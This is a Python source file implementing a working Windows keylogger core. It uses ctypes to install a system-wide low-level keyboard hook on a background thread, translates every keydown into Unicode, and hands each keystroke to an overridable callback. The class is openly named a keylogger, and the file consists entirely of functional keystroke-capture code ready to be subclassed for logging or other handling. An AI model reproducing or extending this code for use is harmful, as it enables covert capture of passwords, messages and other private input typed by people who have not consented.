import time
import ctypes
import threading
from ctypes import wintypes
from abc import abstractmethod

# some global var
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
PM_REMOVE = 0x0001


class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [("vkCode", wintypes.DWORD),
                ("scanCode", wintypes.DWORD),
                ("flags", wintypes.DWORD),
                ("time", wintypes.DWORD),
                ("dwExtraInfo", ctypes.c_void_p)]


class KeyLoggerCore:
    def __init__(self):
        self.hook_handle = None
        self.stop_event = threading.Event()
        self.user32 = ctypes.WinDLL("User32")
        self.kernel32 = ctypes.WinDLL("Kernel32")
        self.thread_worker = threading.Thread(target=self.__hooking_agent)
        self.thread_worker.daemon = True

        # for performance consideration, so we don't need to do this repeatedly in the callback function
        self.user32.CallNextHookEx.restype = ctypes.c_int
        self.user32.CallNextHookEx.argtypes = [wintypes.HHOOK, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM]
        self.user32.GetKeyboardState.restype = bool
        self.user32.GetKeyboardState.argtypes = [ctypes.POINTER(wintypes.BYTE)]
        self.user32.ToUnicode.restype = ctypes.c_int
        self.user32.ToUnicode.argtypes = [wintypes.UINT, wintypes.UINT, ctypes.POINTER(wintypes.BYTE), wintypes.LPWSTR,
                                          ctypes.c_int, wintypes.UINT]

        # create the function pointer for the low-level keyboard proc callback
        self.KEYBOARD_CALLBACK = ctypes.CFUNCTYPE(ctypes.c_int, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)
        self.ll_keyboard_callback_ptr = self.KEYBOARD_CALLBACK(self.__ll_keyboard_callback)

    def __install_hook(self) -> bool:
        """DESC: Set the low-level keyboard hook"""
        # setup low-level keyboard hook
        self.user32.SetWindowsHookExA.restype = wintypes.HHOOK
        self.user32.SetWindowsHookExA.argtypes = [ctypes.c_int, self.KEYBOARD_CALLBACK, wintypes.HINSTANCE,
                                                  wintypes.DWORD]
        self.hook_handle = self.user32.SetWindowsHookExA(WH_KEYBOARD_LL, self.ll_keyboard_callback_ptr, None, 0)

        # check the return value
        if self.hook_handle is None:
            return False
        else:
            return True

    def __uninstall_hook(self) -> bool:
        """DESC: Remove the low-level keyboard hook"""
        # remove low-level keyboard hook
        self.user32.UnhookWindowsHookEx.restype = bool
        self.user32.UnhookWindowsHookEx.argtypes = [wintypes.HHOOK]
        status = self.user32.UnhookWindowsHookEx(self.hook_handle)
        return status

    def __ll_keyboard_callback(self, ncode, wparam, lparam) -> ctypes.c_int:
        """DESC: The callback function for the low-level keyboard hook"""
        if ncode < 0:
            return self.user32.CallNextHookEx(self.hook_handle, ncode, wparam, lparam)

        else:
            if wparam == WM_KEYDOWN:
                kb_struct_ptr = ctypes.cast(lparam,
                                            ctypes.POINTER(KBDLLHOOKSTRUCT))  # typecast to KBDLLHOOKSTRUCT struct ptr
                kb_struct = kb_struct_ptr.contents  # dereference the pointer

                # perform translation on vk-code & scan-code to unicode
                unicode_keypress = self.__vk_to_unicode(kb_struct.vkCode, kb_struct.scanCode, kb_struct.flags)

                # pass the converted unicode to callback function for further processing
                self._custom_callback(unicode_keypress)

        # call next hook
        return self.user32.CallNextHookEx(self.hook_handle, ncode, wparam, lparam)

    def __vk_to_unicode(self, vkcode, scancode, flags) -> str:
        """DESC: Perform the translation on vkcode, scancode into unicode"""
        character_buffer = ctypes.create_unicode_buffer(10)  # assume it will be less than 10 wide char
        keyboard_state = (wintypes.BYTE * 256)()
        keyboard_state_ptr = ctypes.cast(keyboard_state, ctypes.POINTER(wintypes.BYTE))

        # get the keyboard state
        self.user32.GetKeyboardState(keyboard_state_ptr)
        status = self.user32.ToUnicode(vkcode, scancode, keyboard_state_ptr, character_buffer, len(character_buffer),
                                       flags)

        # check return value
        if status > 0:
            return character_buffer.value
        else:
            return ""

    def __hooking_agent(self) -> None:
        """DESC: Perform the hooking and process the widows message loop in a separate thread"""
        self.user32.PeekMessageA.restype = bool
        self.user32.PeekMessageA.argtypes = [ctypes.POINTER(wintypes.MSG), wintypes.HWND, wintypes.UINT, wintypes.UINT,
                                             wintypes.UINT]
        self.user32.DispatchMessageA.restype = ctypes.c_void_p
        self.user32.DispatchMessageA.argtypes = [ctypes.POINTER(wintypes.MSG)]
        msg_loop = wintypes.MSG()

        # install the keyboard hook
        if self.__install_hook():
            print("[INFO] Successfully installed the low-level keyboard hook.")
        else:
            print("[ERROR] Failed to install the low-level keyboard hook !!")

        # process windows message loop
        while not self.stop_event.is_set():
            if self.user32.PeekMessageA(ctypes.byref(msg_loop), None, 0, 0, PM_REMOVE) != 0:
                self.user32.DispatchMessageA(ctypes.byref(msg_loop))
            else:
                time.sleep(0.05)  # Prevent CPU spinning

        # unhook the hook
        if self.__uninstall_hook():
            print("[INFO] Successfully uninstalled the low-level keyboard hook.")
        else:
            print("[ERROR] Failed to uninstall the low-level keyboard hook !!")

    @abstractmethod
    def _custom_callback(self, keypress: str) -> None:
        """DESC: The custom reserved function to customize the keylogger via sub-classing"""
        pass

    def start(self) -> None:
        """DESC: set and start the keylogger"""
        if not self.thread_worker.is_alive():
            # reset the threading event status
            self.stop_event.clear()

            # start the sub-thread to process the windows message loop in background
            self.thread_worker.start()

    def stop(self) -> None:
        """DESC: halt and cleanup the keylogger"""
        if self.thread_worker.is_alive():
            # set the stop event to notify halt
            print("[INFO] Sending the stop signal to the keyboard hooking agent......")
            self.stop_event.set()

            # wait for the sub-thread to join
            self.thread_worker.join()
            print("[INFO] Keyboard hooking thread joined the main thread elegantly.")
